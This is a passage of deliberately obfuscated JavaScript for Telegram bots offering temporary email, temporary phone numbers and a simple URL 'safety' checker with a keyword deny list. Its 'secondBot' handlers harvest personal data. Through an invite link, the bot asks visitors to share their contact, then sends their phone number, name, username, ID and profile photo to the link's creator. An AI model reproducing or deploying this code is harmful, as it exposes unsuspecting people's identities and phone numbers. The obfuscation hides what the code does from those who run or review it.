        bot[_0x143211(0x83a) + 'e'](_0x3b8ee4, _0x5882ab[_0x143211(0x330)], { 'parse_mode': _0x5882ab[_0x143211(0x225)] });
}), bot[_0x54baf1(0x67d)](/\/Messages/, async _0x4499c6 => {
    const _0x54f378 = _0x54baf1, _0x4e0e0f = {
            'JHiMY': _0x54f378(0x3c4),
            'zJNeJ': function (_0x40ad6d) {
                return _0x40ad6d();
            },
            'KXivO': function (_0x28bac2, _0x9a9b39) {
                return _0x28bac2 > _0x9a9b39;
            },
            'icAOx': _0x54f378(0x63a) + _0x54f378(0x3ed) + _0x54f378(0x21f),
            'hfvJl': _0x54f378(0x8aa) + _0x54f378(0x22d) + _0x54f378(0x910) + _0x54f378(0x28a) + 'g>',
            'HhnEX': _0x54f378(0x846) + _0x54f378(0x16d) + _0x54f378(0x2a2) + _0x54f378(0x77a)
        }, _0x55313a = _0x4499c6[_0x54f378(0x2cb)]['id'], _0x251ce3 = _0x4499c6[_0x54f378(0x511)]['id'];
    let _0x1db279 = _0x4e0e0f[_0x54f378(0x833)](readEmails);
    if (_0x1db279[_0x251ce3]) {
        const _0x378b36 = _0x1db279[_0x251ce3];
        try {
            const _0x47b9c3 = await axios[_0x54f378(0x2e2)](_0x54f378(0x497) + _0x54f378(0x8ed) + _0x54f378(0x5f0) + _0x54f378(0x573) + _0x54f378(0x8b9) + _0x378b36 + _0x54f378(0x7aa)), _0xdb9471 = _0x47b9c3[_0x54f378(0x755)];
            _0x4e0e0f[_0x54f378(0x653)](_0xdb9471[_0x54f378(0x5dc)], -0x1b66 + 0x1007 + 0xb5f) ? _0xdb9471[_0x54f378(0x6df)](_0x3d300e => {
                const _0x3050df = _0x54f378;
                bot[_0x3050df(0x83a) + 'e'](_0x55313a, _0x3050df(0x8d6) + _0x3050df(0x493) + _0x3050df(0x4e7) + '\x0a' + _0x3d300e[_0x3050df(0x267)] + '\x0a' + _0x3d300e[_0x3050df(0x5a8)] + _0x3050df(0x708), { 'parse_mode': _0x4e0e0f[_0x3050df(0x1cd)] });
            }) : bot[_0x54f378(0x83a) + 'e'](_0x55313a, _0x4e0e0f[_0x54f378(0x69d)]);
        } catch (_0x4d6055) {
            bot[_0x54f378(0x83a) + 'e'](_0x55313a, _0x4e0e0f[_0x54f378(0x58f)], { 'parse_mode': _0x4e0e0f[_0x54f378(0x1cd)] });
        }
    } else
        bot[_0x54f378(0x83a) + 'e'](_0x55313a, _0x4e0e0f[_0x54f378(0x54d)], { 'parse_mode': _0x4e0e0f[_0x54f378(0x1cd)] });
}), bot[_0x54baf1(0x67d)](/\/de/, _0x367883 => {
    const _0x25a871 = _0x54baf1, _0x15f539 = {
            'sEkAY': function (_0x2a6802) {
                return _0x2a6802();
            },
            'lfFXj': function (_0x4ed147, _0x329fdf) {
                return _0x4ed147(_0x329fdf);
            },
            'LmgXE': _0x25a871(0x551) + _0x25a871(0x723) + _0x25a871(0x543) + '>',
            'JWVjt': _0x25a871(0x3c4),
            'ixUiI': _0x25a871(0x838) + _0x25a871(0x85c) + _0x25a871(0x7fd) + _0x25a871(0x77a)
        }, _0x4fea17 = _0x367883[_0x25a871(0x2cb)]['id'], _0x18cb15 = _0x367883[_0x25a871(0x511)]['id'];
    let _0x17fe17 = _0x15f539[_0x25a871(0x62a)](readEmails);
    _0x17fe17[_0x18cb15] ? (delete _0x17fe17[_0x18cb15], _0x15f539[_0x25a871(0x7a9)](writeEmails, _0x17fe17), bot[_0x25a871(0x83a) + 'e'](_0x4fea17, _0x15f539[_0x25a871(0x36d)], { 'parse_mode': _0x15f539[_0x25a871(0x4a4)] })) : bot[_0x25a871(0x83a) + 'e'](_0x4fea17, _0x15f539[_0x25a871(0x17b)], { 'parse_mode': _0x15f539[_0x25a871(0x4a4)] });
}), bot[_0x54baf1(0x67d)](/\/de/, async _0xbe9917 => {
    const _0x4ae8b2 = _0x54baf1, _0x189448 = {
            'snkJg': _0x4ae8b2(0x551) + _0x4ae8b2(0x723) + _0x4ae8b2(0x543) + '>',
            'xeaYl': _0x4ae8b2(0x3c4),
            'qWmCQ': _0x4ae8b2(0x838) + _0x4ae8b2(0x810) + _0x4ae8b2(0x2e7) + _0x4ae8b2(0x77a)
        }, _0x4fe991 = _0xbe9917[_0x4ae8b2(0x2cb)]['id'];
    try {
        fs[_0x4ae8b2(0x1f0)](_0x4ae8b2(0x506) + _0x4fe991 + _0x4ae8b2(0x836)), bot[_0x4ae8b2(0x83a) + 'e'](_0x4fe991, _0x189448[_0x4ae8b2(0x86f)], { 'parse_mode': _0x189448[_0x4ae8b2(0x651)] });
    } catch (_0x2e2635) {
        bot[_0x4ae8b2(0x83a) + 'e'](_0x4fe991, _0x189448[_0x4ae8b2(0x784)], { 'parse_mode': _0x189448[_0x4ae8b2(0x651)] });
    }
}), bot[_0x54baf1(0x67d)](/\/sخسننسمس/, _0x44c3cf => {
    const _0x443d4d = _0x54baf1, _0x8530d5 = {
            'Uioll': _0x443d4d(0x4e3) + _0x443d4d(0x465),
            'DLTqg': _0x443d4d(0x3e7) + _0x443d4d(0x8f7),
            'NFALb': _0x443d4d(0x53b) + _0x443d4d(0x17d) + _0x443d4d(0x2dd) + _0x443d4d(0x84c)
        }, _0x3aae3d = _0x44c3cf[_0x443d4d(0x2cb)]['id'], _0x450b20 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x8530d5[_0x443d4d(0x4dc)],
                            'callback_data': _0x8530d5[_0x443d4d(0x77d)]
                        }]]
            }
        };
    bot[_0x443d4d(0x83a) + 'e'](_0x3aae3d, _0x8530d5[_0x443d4d(0x275)], _0x450b20);
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), _0x574c78 => {
    const _0x27a787 = _0x54baf1, _0x319ceb = {
            'VBsGi': function (_0x343745, _0x2f8f0f) {
                return _0x343745 === _0x2f8f0f;
            },
            'VfohM': _0x27a787(0x3e7) + _0x27a787(0x8f7)
        };
    if (_0x319ceb[_0x27a787(0x285)](_0x574c78[_0x27a787(0x755)], _0x319ceb[_0x27a787(0x8a4)])) {
        const _0x3dab70 = _0x574c78[_0x27a787(0x511)]['id'], _0x2cf952 = _0x27a787(0x70c) + _0x27a787(0x79b) + _0x27a787(0x33e) + _0x3dab70;
        bot[_0x27a787(0x83a) + 'e'](_0x574c78[_0x27a787(0x7ed)][_0x27a787(0x2cb)]['id'], _0x27a787(0x52d) + _0x27a787(0x77b) + _0x27a787(0x7ec) + _0x27a787(0x320) + _0x27a787(0x5b1) + _0x27a787(0x71c) + ':\x0a' + _0x2cf952);
    }
}), secondBot[_0x54baf1(0x67d)](/\/start (.+)/, (_0x3e4b36, _0x5c54ec) => {
    const _0x1a8590 = _0x54baf1, _0x1c33f0 = {
            'Bbjjt': function (_0x11acd4, _0x2aeaea) {
                return _0x11acd4(_0x2aeaea);
            },
            'idHXf': _0x1a8590(0x3dd) + _0x1a8590(0x1e1),
            'qvygF': _0x1a8590(0x6eb) + _0x1a8590(0x1d5) + _0x1a8590(0x360) + _0x1a8590(0x1ba) + _0x1a8590(0x78c)
        }, _0x3f38f7 = _0x3e4b36[_0x1a8590(0x2cb)]['id'], _0x3756b2 = _0x1c33f0[_0x1a8590(0x6e8)](parseInt, _0x5c54ec[-0x1 * 0x1f85 + 0x196b + -0x1 * -0x61b]);
    inviteLinks[_0x3e4b36[_0x1a8590(0x511)]['id']] = _0x3756b2;
    const _0x235b18 = {
        'reply_markup': {
            'keyboard': [[{
                        'text': _0x1c33f0[_0x1a8590(0x6a6)],
                        'request_contact': !![]
                    }]],
            'one_time_keyboard': !![]
        }
    };
    secondBot[_0x1a8590(0x83a) + 'e'](_0x3f38f7, _0x1c33f0[_0x1a8590(0x365)], _0x235b18);
}), secondBot['on'](_0x54baf1(0x172), _0x2ef566 => {
    const _0x2c86b5 = _0x54baf1, _0x2af65d = {
            'rgJAN': _0x2c86b5(0x686) + _0x2c86b5(0x390) + 'ح.',
            'XmuTN': _0x2c86b5(0x188) + _0x2c86b5(0x26d) + _0x2c86b5(0x244),
            'gTfgR': _0x2c86b5(0x593),
            'yZkmU': function (_0x413075, _0x470082) {
                return _0x413075 + _0x470082;
            },
            'EkOPX': function (_0xebf70a, _0x597729) {
                return _0xebf70a + _0x597729;
            },
            'objBg': function (_0x41a431, _0x3c9207) {
                return _0x41a431 > _0x3c9207;
            },
            'aHdLO': _0x2c86b5(0x251) + _0x2c86b5(0x927),
            'XBjwN': _0x2c86b5(0x188) + _0x2c86b5(0x4f8) + _0x2c86b5(0x193) + _0x2c86b5(0x8f0) + _0x2c86b5(0x1a4),
            'lpBYV': _0x2c86b5(0x7d3) + _0x2c86b5(0x41a) + _0x2c86b5(0x644) + _0x2c86b5(0x4a0) + _0x2c86b5(0x66e) + _0x2c86b5(0x318),
            'iXQGN': function (_0x309612, _0x303ca5) {
                return _0x309612 === _0x303ca5;
            },
            'XwWSn': _0x2c86b5(0x697) + _0x2c86b5(0x857),
            'tHSbZ': _0x2c86b5(0x6c9) + 'ذة',
            'kGPLM': _0x2c86b5(0x6eb) + _0x2c86b5(0x1d5) + _0x2c86b5(0x48e) + _0x2c86b5(0x4cc),
            'oTVfm': _0x2c86b5(0x26f) + _0x2c86b5(0x6aa) + _0x2c86b5(0x772)
        };
    if (_0x2ef566[_0x2c86b5(0x172)] && inviteLinks[_0x2ef566[_0x2c86b5(0x511)]['id']]) {
        if (_0x2af65d[_0x2c86b5(0x6fc)](_0x2ef566[_0x2c86b5(0x172)][_0x2c86b5(0x24d)], _0x2ef566[_0x2c86b5(0x511)]['id'])) {
            const _0x82cfa0 = inviteLinks[_0x2ef566[_0x2c86b5(0x511)]['id']], _0x2cdd89 = _0x2ef566[_0x2c86b5(0x511)], _0x4dc8ce = _0x2cdd89['id'], _0x252493 = _0x2cdd89[_0x2c86b5(0x47e)], _0x52d596 = _0x2cdd89[_0x2c86b5(0x8fe)] || '', _0x775295 = _0x2cdd89[_0x2c86b5(0x45f)] || _0x2af65d[_0x2c86b5(0x442)], _0x532811 = _0x2cdd89[_0x2c86b5(0x862)] || _0x2af65d[_0x2c86b5(0x4b3)], _0x879c8b = _0x2ef566[_0x2c86b5(0x172)][_0x2c86b5(0x331) + 'er'];
            secondBot[_0x2c86b5(0x70e) + _0x2c86b5(0x25a)](_0x4dc8ce)[_0x2c86b5(0x39c)](_0x3a05fd => {
                const _0x11262b = _0x2c86b5, _0xf9812b = {
                        'uHThB': _0x2af65d[_0x11262b(0x7fb)],
                        'ayoSx': _0x2af65d[_0x11262b(0x48d)],
                        'nwEDX': _0x2af65d[_0x11262b(0x24e)]
                    }, _0x52321c = _0x2af65d[_0x11262b(0x83f)](_0x2af65d[_0x11262b(0x83f)](_0x2af65d[_0x11262b(0x83f)](_0x2af65d[_0x11262b(0x554)](_0x11262b(0x3cf) + _0x11262b(0x171) + '\x0a', _0x11262b(0x22a) + _0x252493 + '\x20' + _0x52d596 + _0x11262b(0x3b0)), _0x11262b(0x19f) + '@' + _0x775295 + _0x11262b(0x3b0)), _0x11262b(0x36e) + _0x4dc8ce + _0x11262b(0x3b0)), _0x11262b(0x457) + _0x11262b(0x5c9) + _0x879c8b + '\x0a');
                if (_0x2af65d[_0x11262b(0x528)](_0x3a05fd[_0x11262b(0x3a1) + 't'], 0x1641 + -0x97a + 0x1 * -0xcc7)) {
                    const _0x468c2a = _0x3a05fd[_0x11262b(0x83c)][0x1 * 0x1b99 + 0x1 * 0xfd9 + -0x15b9 * 0x2][0x168e + 0x1 * -0x78b + 0x501 * -0x3][_0x11262b(0x484)];
                    _0x468c2a ? bot[_0x11262b(0x7ca)](_0x82cfa0, _0x468c2a, {
                        'caption': _0x52321c,
                        'parse_mode': _0x2af65d[_0x11262b(0x24e)]
                    })[_0x11262b(0x39c)](() => {
                        const _0x16eceb = _0x11262b;
                        console[_0x16eceb(0x3f8)](_0xf9812b[_0x16eceb(0x6ad)]);
                    })[_0x11262b(0x732)](_0x2a52d2 => {
                        const _0x600d35 = _0x11262b;
                        console[_0x600d35(0x44a)](_0xf9812b[_0x600d35(0x7f1)], _0x2a52d2), bot[_0x600d35(0x83a) + 'e'](_0x82cfa0, _0x52321c, { 'parse_mode': _0xf9812b[_0x600d35(0x824)] });
                    }) : bot[_0x11262b(0x83a) + 'e'](_0x82cfa0, _0x52321c, { 'parse_mode': _0x2af65d[_0x11262b(0x24e)] });
                } else
                    bot[_0x11262b(0x83a) + 'e'](_0x82cfa0, _0x52321c, { 'parse_mode': _0x2af65d[_0x11262b(0x24e)] });
                secondBot[_0x11262b(0x83a) + 'e'](_0x2ef566[_0x11262b(0x2cb)]['id'], _0x2af65d[_0x11262b(0x6a3)]), delete inviteLinks[_0x2ef566[_0x11262b(0x511)]['id']];
            })[_0x2c86b5(0x732)](_0x1862ef => {
                const _0x484e8d = _0x2c86b5;
                console[_0x484e8d(0x44a)](_0x2af65d[_0x484e8d(0x230)], _0x1862ef), secondBot[_0x484e8d(0x83a) + 'e'](_0x2ef566[_0x484e8d(0x2cb)]['id'], _0x2af65d[_0x484e8d(0x325)]);
            });
        } else
            secondBot[_0x2c86b5(0x83a) + 'e'](_0x2ef566[_0x2c86b5(0x2cb)]['id'], _0x2af65d[_0x2c86b5(0x8a8)]);
    } else
        secondBot[_0x2c86b5(0x83a) + 'e'](_0x2ef566[_0x2c86b5(0x2cb)]['id'], _0x2af65d[_0x2c86b5(0x1be)]);
}), secondBot['on'](_0x54baf1(0x7ed), _0x37e42f => {
    const _0x301702 = _0x54baf1, _0x179f52 = {
            'GJzGD': function (_0x12b5fa, _0x4e51a6) {
                return _0x12b5fa !== _0x4e51a6;
            },
            'QGJTI': _0x301702(0x7d8),
            'ZrJFz': _0x301702(0x3dd) + _0x301702(0x1e1),
            'BpLYV': _0x301702(0x6eb) + _0x301702(0x1d5) + _0x301702(0x1d9)
        };
    if (!_0x37e42f[_0x301702(0x172)] && _0x179f52[_0x301702(0x3f4)](_0x37e42f[_0x301702(0x7e0)], _0x179f52[_0x301702(0x776)])) {
        const _0x547a26 = {
            'reply_markup': {
                'keyboard': [[{
                            'text': _0x179f52[_0x301702(0x78f)],
                            'request_contact': !![]
                        }]],
                'one_time_keyboard': !![]
            }
        };
        secondBot[_0x301702(0x83a) + 'e'](_0x37e42f[_0x301702(0x2cb)]['id'], _0x179f52[_0x301702(0x91f)], _0x547a26);
    }
});
const countries = {
    '+1': [
        _0x54baf1(0x36f),
        _0x54baf1(0x8ec)
    ],
    '+46': [
        _0x54baf1(0x6f9),
        _0x54baf1(0x2a7)
    ],
    '+86': [
        _0x54baf1(0x7ef),
        _0x54baf1(0x4ec)
    ],
    '+852': [
        _0x54baf1(0x771),
        _0x54baf1(0x1b8)
    ],
    '+45': [
        _0x54baf1(0x5a0),
        _0x54baf1(0x2a8)
    ],
    '+33': [
        _0x54baf1(0x689),
        _0x54baf1(0x310)
    ],
    '+31': [
        _0x54baf1(0x636),
        _0x54baf1(0x5d7)
    ],
    '+7': [
        _0x54baf1(0x4f1),
        _0x54baf1(0x744)
    ],
    '+7KZ': [
        _0x54baf1(0x1e3),
        _0x54baf1(0x26c)
    ],
    '+381': [
        _0x54baf1(0x758),
        _0x54baf1(0x1ee)
    ],
    '+44': [
        _0x54baf1(0x523),
        _0x54baf1(0x1fb)
    ],
    '+371': [
        _0x54baf1(0x8cf),
        _0x54baf1(0x81b)
    ],
    '+62': [
        _0x54baf1(0x1b2),
        _0x54baf1(0x3a5)
    ],
    '+351': [
        _0x54baf1(0x572),
        _0x54baf1(0x2cc)
    ],
    '+34': [
        _0x54baf1(0x81e),
        _0x54baf1(0x393)
    ],
    '+372': [
        _0x54baf1(0x3f9),
        _0x54baf1(0x182)
    ],
    '+358': [
        _0x54baf1(0x569),
        _0x54baf1(0x864)
    ]
};
async function importNumbers() {
    const _0x2d8079 = _0x54baf1, _0x45e278 = {
            'MujaS': _0x2d8079(0x4d9) + _0x2d8079(0x36a) + _0x2d8079(0x6c1),
            'PdJzo': _0x2d8079(0x4fa) + _0x2d8079(0x388)
        };
    try {
        const _0x213ba2 = await axios[_0x2d8079(0x2e2)](_0x45e278[_0x2d8079(0x83e)]);
        return _0x213ba2[_0x2d8079(0x755)][_0x2d8079(0x699)]('\x0a');
    } catch (_0x10697c) {
        return console[_0x2d8079(0x44a)](_0x45e278[_0x2d8079(0x550)], _0x10697c), [];
    }
}
async function getRandomNumberInfo() {
    const _0x24abc5 = _0x54baf1, _0x26a10e = {
            'WvcEw': function (_0x12fe59) {
                return _0x12fe59();
            },
            'yfBec': function (_0x1e2bcd, _0x31e676) {
                return _0x1e2bcd === _0x31e676;
            },
            'PFuQp': function (_0x9c055e, _0x1d5910) {
                return _0x9c055e * _0x1d5910;
            },
            'ALZXa': _0x24abc5(0x6f4),
            'PPhLM': _0x24abc5(0x431),
            'ojZhy': function (_0x60348a, _0x2c5af2) {
                return _0x60348a in _0x2c5af2;
            },
            'TLuGi': _0x24abc5(0x8b6) + _0x24abc5(0x184)
        }, _0x142dc6 = await _0x26a10e[_0x24abc5(0x21d)](importNumbers);
    if (_0x26a10e[_0x24abc5(0x802)](_0x142dc6[_0x24abc5(0x5dc)], 0x1 * 0x16e4 + 0x200f * -0x1 + 0x92b))
        return null;
    const _0x98672 = Math[_0x24abc5(0x4fc)](_0x26a10e[_0x24abc5(0x87b)](Math[_0x24abc5(0x347)](), _0x142dc6[_0x24abc5(0x5dc)])), _0x301281 = _0x142dc6[_0x98672][_0x24abc5(0x531)](), _0x24726e = new Date()[_0x24abc5(0x219) + 'g']()[_0x24abc5(0x699)]('T')[-0x5 * -0x2b + -0x2eb * -0xd + -0x26c6], _0x599aaa = new Date()[_0x24abc5(0x78e) + _0x24abc5(0x31d)](_0x26a10e[_0x24abc5(0x8d1)]);
    let _0x1871e8;
    if (_0x301281[_0x24abc5(0x825)]('+1'))
        _0x1871e8 = '+1';
    else
        _0x301281[_0x24abc5(0x825)]('+7') ? _0x1871e8 = _0x301281[_0x24abc5(0x487)]('7') ? _0x26a10e[_0x24abc5(0x671)] : '+7' : _0x1871e8 = _0x26a10e[_0x24abc5(0x819)](_0x301281[_0x24abc5(0x18b)](0x18d0 + -0x44 * -0x20 + 0x1a * -0x148, 0x159 * 0x5 + -0x1001 + 0x948), countries) ? _0x301281[_0x24abc5(0x18b)](-0x12f9 + 0x8e * -0x3b + 0x1 * 0x33b3, 0x1 * 0xc91 + -0xfa3 + 0x316) : _0x301281[_0x24abc5(0x18b)](-0x115f * 0x1 + 0xf9 + 0x1066, 0x943 + -0xde9 + 0x1 * 0x4a9);
    const [_0x4e94cb, _0x3344c7] = countries[_0x1871e8] || [
        _0x26a10e[_0x24abc5(0x87e)],
        '🚩'
    ];
    return {
        'number': _0x301281,
        'countryCode': _0x1871e8,
        'countryName': _0x4e94cb,
        'countryFlag': _0x3344c7,
        'creationDate': _0x24726e,
        'creationTime': _0x599aaa
    };
}
async function getMessages(_0x3596a6) {
    const _0x3bccee = _0x54baf1, _0x4a57aa = {
            'sTupe': function (_0x2d85f7, _0x4374c7) {
                return _0x2d85f7(_0x4374c7);
            },
            'jXsmN': function (_0x3d0106, _0x10b144) {
                return _0x3d0106(_0x10b144);
            },
            'WQEOW': _0x3bccee(0x571) + _0x3bccee(0x65f) + _0x3bccee(0x839),
            'nmxrl': _0x3bccee(0x4fa) + _0x3bccee(0x870)
        };
    try {
        const _0x86f77d = await axios[_0x3bccee(0x2e2)](_0x3bccee(0x8ab) + _0x3bccee(0x89e) + _0x3bccee(0x1d0) + _0x3596a6), _0x3e9156 = cheerio[_0x3bccee(0x5d5)](_0x86f77d[_0x3bccee(0x755)]), _0x20ff49 = [];
        return _0x4a57aa[_0x3bccee(0x30e)](_0x3e9156, _0x4a57aa[_0x3bccee(0x592)])[_0x3bccee(0x423)]((_0x9a06d7, _0x5a456c) => {
            const _0x321d6e = _0x3bccee;
            _0x20ff49[_0x321d6e(0x5bd)](_0x4a57aa[_0x321d6e(0x65e)](_0x3e9156, _0x5a456c)[_0x321d6e(0x7e0)]()[_0x321d6e(0x531)]());
        }), _0x20ff49;
    } catch (_0x342c7b) {
        return console[_0x3bccee(0x44a)](_0x4a57aa[_0x3bccee(0x1e6)], _0x342c7b), [];
    }
}
bot[_0x54baf1(0x67d)](/\/stسمهصخصt/, _0x3c6ed5 => {
    const _0x3d6de2 = _0x54baf1, _0x14cff3 = {
            'lZdWz': _0x3d6de2(0x92a) + _0x3d6de2(0x759),
            'QDrFX': _0x3d6de2(0x5da),
            'nGZaz': _0x3d6de2(0x7a0) + _0x3d6de2(0x6d6) + _0x3d6de2(0x177) + _0x3d6de2(0x62c)
        }, _0x5b6a44 = _0x3c6ed5[_0x3d6de2(0x2cb)]['id'], _0x321c9e = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x14cff3[_0x3d6de2(0x5e8)],
                            'callback_data': _0x14cff3[_0x3d6de2(0x4f6)]
                        }]]
            }
        };
    bot[_0x3d6de2(0x83a) + 'e'](_0x5b6a44, _0x14cff3[_0x3d6de2(0x76a)], _0x321c9e);
});
const m = _0x54baf1(0x5e3) + _0x54baf1(0x42a) + 'ج';
bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), async _0x49944d => {
    const _0x1c5e07 = _0x54baf1, _0x269e64 = {
            'aZSam': function (_0x2cae7e, _0x2230ee) {
                return _0x2cae7e === _0x2230ee;
            },
            'bzjQb': _0x1c5e07(0x5da),
            'rYGUS': function (_0x480687) {
                return _0x480687();
            },
            'ImjBq': _0x1c5e07(0x398) + _0x1c5e07(0x925),
            'CWQgb': _0x1c5e07(0x61a) + '💬',
            'QAYgc': function (_0x82d2fb, _0xa9afa) {
                return _0x82d2fb + _0xa9afa;
            },
            'wYjRD': function (_0x1e91fd, _0x178a32) {
                return _0x1e91fd + _0x178a32;
            },
            'chVdR': function (_0x14a3f3, _0x5e4210) {
                return _0x14a3f3 + _0x5e4210;
            },
            'FkpLe': function (_0x271461, _0x19f9f8) {
                return _0x271461 + _0x19f9f8;
            },
            'XsRcx': _0x1c5e07(0x593),
            'nOisq': _0x1c5e07(0x63a) + _0x1c5e07(0x6c3) + _0x1c5e07(0x3d1),
            'yHkKO': _0x1c5e07(0x241) + _0x1c5e07(0x3e0),
            'lBdFW': function (_0x136299, _0x4d25d9) {
                return _0x136299(_0x4d25d9);
            },
            'tnUdX': function (_0x41394f, _0x47e086) {
                return _0x41394f > _0x47e086;
            },
            'pJxQQ': _0x1c5e07(0x383) + _0x1c5e07(0x7d9) + _0x1c5e07(0x2db),
            'dexzH': _0x1c5e07(0x7e1) + _0x1c5e07(0x768)
        }, _0x58fc6c = _0x49944d[_0x1c5e07(0x7ed)], _0x25eda3 = _0x58fc6c[_0x1c5e07(0x2cb)]['id'], _0x207ce4 = _0x49944d[_0x1c5e07(0x755)];
    if (_0x269e64[_0x1c5e07(0x1e2)](_0x207ce4, _0x269e64[_0x1c5e07(0x7b9)])) {
        const _0x4fa249 = await _0x269e64[_0x1c5e07(0x392)](getRandomNumberInfo);
        if (_0x4fa249) {
            const _0x131ef3 = {
                    'reply_markup': {
                        'inline_keyboard': [
                            [{
                                    'text': _0x269e64[_0x1c5e07(0x28b)],
                                    'callback_data': _0x269e64[_0x1c5e07(0x7b9)]
                                }],
                            [{
                                    'text': _0x269e64[_0x1c5e07(0x6ae)],
                                    'callback_data': _0x1c5e07(0x241) + _0x1c5e07(0x3e0) + _0x4fa249[_0x1c5e07(0x8fd)]
                                }]
                        ]
                    }
                }, _0x1f43b9 = _0x269e64[_0x1c5e07(0x1f8)](_0x269e64[_0x1c5e07(0x1b7)](_0x269e64[_0x1c5e07(0x1b7)](_0x269e64[_0x1c5e07(0x1f8)](_0x269e64[_0x1c5e07(0x8ff)](_0x269e64[_0x1c5e07(0x45d)](_0x1c5e07(0x6da) + _0x1c5e07(0x76f) + _0x1c5e07(0x29d) + _0x1c5e07(0x42f) + _0x4fa249[_0x1c5e07(0x8fd)] + '`\x0a', _0x1c5e07(0x90c) + '\x20' + _0x4fa249[_0x1c5e07(0x18e) + 'e'] + '\x20' + _0x4fa249[_0x1c5e07(0x7b8) + 'g'] + '\x0a'), _0x1c5e07(0x837) + _0x1c5e07(0x730) + _0x4fa249[_0x1c5e07(0x904) + 'e'] + '\x0a'), _0x1c5e07(0x3be) + _0x1c5e07(0x5c9) + m + '\x0a'), _0x1c5e07(0x79d) + _0x1c5e07(0x424) + _0x4fa249[_0x1c5e07(0x3c0) + 'te'] + '\x0a'), _0x1c5e07(0x655) + _0x1c5e07(0x81a) + _0x4fa249[_0x1c5e07(0x49c) + 'me'] + '\x0a'), _0x1c5e07(0x88f) + _0x1c5e07(0x26b) + '.');
            bot[_0x1c5e07(0x6e6) + _0x1c5e07(0x78b)](_0x1f43b9, {
                'chat_id': _0x25eda3,
                'message_id': _0x58fc6c[_0x1c5e07(0x19c)],
                'parse_mode': _0x269e64[_0x1c5e07(0x814)],
                'reply_markup': _0x131ef3[_0x1c5e07(0x413) + 'up']
            });
        } else
            bot[_0x1c5e07(0x83a) + 'e'](_0x25eda3, _0x269e64[_0x1c5e07(0x42b)]);
    } else {
        if (_0x207ce4[_0x1c5e07(0x825)](_0x269e64[_0x1c5e07(0x835)])) {
            const _0x5e4c88 = _0x207ce4[_0x1c5e07(0x699)]('_')[0xc18 * 0x2 + 0x75 * 0x3b + 0x3325 * -0x1], _0x1072b9 = await _0x269e64[_0x1c5e07(0x265)](getMessages, _0x5e4c88);
            if (_0x269e64[_0x1c5e07(0x5c0)](_0x1072b9[_0x1c5e07(0x5dc)], 0x1962 + 0xfc5 + -0x2927)) {
                let _0x4c3a84 = _0x1072b9[_0x1c5e07(0x18b)](0xb6f * -0x1 + 0x1 * -0xe4f + 0x19be, 0x17ae + -0x12de + 0x4ca * -0x1)[_0x1c5e07(0x502)]((_0x336dd8, _0x24484a) => _0x1c5e07(0x658) + 'م\x20' + (_0x24484a + (-0xa45 * 0x3 + 0xa8d + 0x1443)) + _0x1c5e07(0x51c) + _0x336dd8 + '`')[_0x1c5e07(0x45e)]('\x0a\x0a');
                _0x4c3a84 += _0x269e64[_0x1c5e07(0x542)], bot[_0x1c5e07(0x83a) + 'e'](_0x25eda3, _0x4c3a84, { 'parse_mode': _0x269e64[_0x1c5e07(0x814)] });
            } else
                bot[_0x1c5e07(0x83a) + 'e'](_0x25eda3, _0x269e64[_0x1c5e07(0x6dc)]);
        }
    }
});
const dangerous_keywords = [
        _0x54baf1(0x1bf),
        _0x54baf1(0x637),
        'gd',
        _0x54baf1(0x454),
        _0x54baf1(0x361),
        _0x54baf1(0x4ab),
        _0x54baf1(0x39e),
        _0x54baf1(0x46a),
        _0x54baf1(0x623),
        _0x54baf1(0x321),
        _0x54baf1(0x5b8),
        _0x54baf1(0x605),
        _0x54baf1(0x539)
    ], safe_urls = [
        _0x54baf1(0x8b4),
        _0x54baf1(0x32e),
        _0x54baf1(0x892),
        _0x54baf1(0x713) + _0x54baf1(0x2a0),
        _0x54baf1(0x786) + _0x54baf1(0x8b7),
        _0x54baf1(0x922) + 'om',
        _0x54baf1(0x674),
        _0x54baf1(0x311),
        _0x54baf1(0x630) + 'om',
        _0x54baf1(0x173),
        _0x54baf1(0x91a) + 'om'
    ];
let waiting_for_link = {};
function checkUrl(_0x1679d5) {
    const _0x509c24 = _0x54baf1, _0x30bdf1 = {
            'jKhOb': _0x509c24(0x3e5),
            'cqOeH': _0x509c24(0x601) + '🔴',
            'UlBuI': _0x509c24(0x173),
            'omWdL': _0x509c24(0x68e)
        }, _0x98ede8 = _0x1679d5[_0x509c24(0x799) + 'e']();
    for (let _0x365977 of safe_urls) {
        if (_0x98ede8[_0x509c24(0x487)](_0x365977))
            return _0x30bdf1[_0x509c24(0x2b8)];
    }
    for (let _0x2acaa4 of dangerous_keywords) {
        if (_0x98ede8[_0x509c24(0x487)](_0x2acaa4))
            return _0x30bdf1[_0x509c24(0x7b1)];
    }
    if (!_0x98ede8[_0x509c24(0x487)](_0x30bdf1[_0x509c24(0x3fe)]))
        return _0x30bdf1[_0x509c24(0x3c8)];
    return _0x30bdf1[_0x509c24(0x2b8)];
}
function isValidUrl(_0xfd8bd) {
    const _0x2e79ae = _0x54baf1, _0x2180a1 = new RegExp(/^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i);
    return _0x2180a1[_0x2e79ae(0x197)](_0xfd8bd);
}
async function getIpInfo(_0xc31945) {
    const _0x4ad52e = _0x54baf1;
    try {
        const _0x51b068 = await axios[_0x4ad52e(0x2e2)](_0x4ad52e(0x7d5) + _0x4ad52e(0x28e) + _0xc31945 + _0x4ad52e(0x338));
        return _0x51b068[_0x4ad52e(0x755)];
    } catch (_0x4eb72b) {
        return null;
    }
}
function extractIpFromUrl(_0x4a0fd4) {
    const _0x13424d = _0x54baf1, _0x4b4e30 = {
            'OmJkh': function (_0x1401c0, _0x5b4fc1) {
                return _0x1401c0(_0x5b4fc1);
            },
            'mWdsM': function (_0x548e87, _0x1e3e99) {
                return _0x548e87(_0x1e3e99);
            }
        };
    try {
        const _0x1a6a33 = new URL(_0x4a0fd4)[_0x13424d(0x1af)];
        return new Promise((_0xcaa089, _0x30e8c1) => {
            const _0x4bd5c9 = _0x13424d;
            dns[_0x4bd5c9(0x6a5)](_0x1a6a33, (_0x3b9a8c, _0x1cdc24) => {
                const _0x315f51 = _0x4bd5c9;
                if (_0x3b9a8c)
                    _0x4b4e30[_0x315f51(0x81d)](_0x30e8c1, null);
                else
                    _0x4b4e30[_0x315f51(0x16e)](_0xcaa089, _0x1cdc24);
            });
        });
    } catch (_0x284242) {
        return null;
    }
}
bot[_0x54baf1(0x67d)](/\/sكخزننننtart/, _0x9cd6f5 => {
